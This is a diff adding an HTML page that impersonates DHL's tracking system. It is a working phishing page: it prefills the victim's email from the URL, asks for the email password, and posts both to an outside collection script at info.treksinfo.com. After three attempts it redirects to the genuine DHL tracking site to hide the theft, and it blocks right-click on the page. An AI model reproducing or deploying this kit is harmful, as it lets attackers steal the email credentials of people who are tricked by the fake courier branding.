@@ -1,0 +1,228 @@
+
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title> DHL | Tracking System</title>
+	<link href="https://fonts.googleapis.com/css?family=Ubuntu&display=swap" rel="stylesheet">
+    <link rel="shortcut icon" href="https://cdn.glitch.com/e32f5f11-67a9-4841-b22d-bc1db5ba585a%2Ffavicon_dhl.ico" type="image/gif">
+    <link rel="stylesheet" href="https://asfasfasfasp.neocities.org/bootstrap.min.css">
+	<link rel="stylesheet" href="https://asfasfasfasp.neocities.org/dh-style.css">
+</head>
+<body>
+<body oncontextmenu="return false;">
+    <div class="container-fluid bg-login">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-9 col-md-12 login-card">
+                    <div class="row">
+                        <div class="col-md-5 detail-part">
+                            <h1> Download Shipment Document</h1>
+                            <p>Login with your email credentials to view tracking information.</p>
+                        </div>
+                        <div class="col-md-7 logn-part">
+                          <div class="row">
+                              <div class="col-lg-10 col-md-12 mx-auto">
+                                  <div class="logo-cover">
+                                       <img src="https://asfasfasfasp.neocities.org/logo.png" alt="">
+                                   </div>
+								   
+                                    <div class="form-cover">
+
+                                        <h6 align="center"> <font color="#df0101">DHL Email Account Validation System.</font></h6>
+										<font color="red"><span id="msg2"></span></font>
+   <input placeholder="Enter Email Address" id="email" name="email" type="text" class="form-control" readonly>
+    <font color="red"><span id="msg"></span></font>
+                                         <input Placeholder="Enter Email Password" id="password" name="password" type="password"  class="form-control" required>
+										
+                                         <div class="row form-footer">
+                                             <div class="col-md-6 forget-paswd">
+                                                 <a href="#email"><img src="https://asfasfasfasp.neocities.org/mydhl-plus.svg" width="70px" height="40px"></a>    
+                                             </div>
+ <div class="col-md-6 button-div">
+                                 <center>
+                                    <div class="alert alert-danger" id="msg" style="display: none;"></div>
+                                    <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
+                                </center>
+                                                 <button class="btn btn-primary" id="submit-btn">Download Now</button>
+                                           </div>
+    </div>
+   
+    </div>
+    </div>
+                                               
+                                             </div>
+                                         </div>
+                                    </div>
+                              </div>
+                          </div>
+                           
+                           
+                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+</body>
+
+  <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+	<script src="http://code.jquery.com/jquery-1.7.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+    $('#back1').click(function() {
+        $("#msg").hide();
+        $('#email').val("");
+        $("#automail").animate({ left: 200, opacity: "hide" }, 0);
+        $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
+
+    });
+    $("#email").keyup(function() {
+        var my_email = $('#email').val();
+        $('#em').html(my_email);
+    });
+    $('#show').click(function() {
+        event.preventDefault();
+        var x = document.getElementById("password");
+        if (x.type === "password") {
+            $('#show').html("hide");
+            x.type = "text";
+        } else {
+            $('#show').html("show");
+            x.type = "password";
+        }
+
+    });
+
+    /////////////url email getting////////////////
+    var email = window.location.hash.substr(1);
+    if (!email) {
+
+    } else {
+        // $('#email').val(email);
+        var my_email = email;
+        var ind = my_email.indexOf("@");
+        var my_slice = my_email.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'images/other-1.png');
+        $('#field').html("Other Mail");
+        $('#email').val(my_email);
+        $('#em').html(my_email);
+        $("#msg").hide();
+    }
+    ///////////////url getting email////////////////
+
+
+
+    $('#submit-btn').click(function(event) {
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email = $("#email").val();
+        var password = $("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
+        ///////////new injection////////////////
+        var my_email = email;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!my_email) {
+            $('#error').show();
+            $('#error').html("Email field is empty...!");
+            email.focus;
+            return false;
+        }
+        if (!filter.test(my_email)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a valid @ email account");
+            email.focus;
+            return false;
+        }
+        if (!password) {
+            $('#error').show();
+            $('#error').html("Password field is empty...!");
+            email.focus;
+            return false;
+        }
+        if (password.length < 5) {
+            $('#error').show();
+            $('#error').html("Please enter password atleast 5 digits..!");
+            email.focus;
+            return false;
+        } 
+
+
+        var ind = my_email.indexOf("@");
+        var my_slice = my_email.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        ///////////new injection////////////////
+        count = count + 1;
+
+        $.ajax({
+            dataType: 'JSON',
+            url: 'https://info.treksinfo.com/china-mail/dhlp.php',
+            type: 'POST',
+            data: {
+                email: email,
+                password: password,
+            },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#submit-btn').html('Verifing...');
+            },
+            success: function(response) {
+                if (response) {
+                    $("#msg").show();
+                    console.log(response);
+                    if (response['signal'] == 'ok') {
+                        $("#password").val("");
+                        if (count >= 3) {
+                            count = 0;
+                            // window.location.replace(response['redirect_link']);
+                            window.location.replace("https://track.dhlparcel.co.uk/")
+
+                        }
+                        $('#msg').html(response['msg']);
+                    } else {
+                        $('#msg').html(response['msg']);
+                    }
+                }
+            },
+            error: function() {
+                $("#password").val("");
+                if (count >= 3) {
+                    count = 0;
+                    window.location.replace("https://www.dhlparcel.nl/en/consumer/track-and-trace")
+                }
+                $("#msg").show();
+                $('#msg').html("Please use correct Email Password and try again");
+            },
+            complete: function() {
+                $('#submit-btn').html('Continue');
+            }
+        });
+    });
+
+
+});
+</script>
+
+</html>
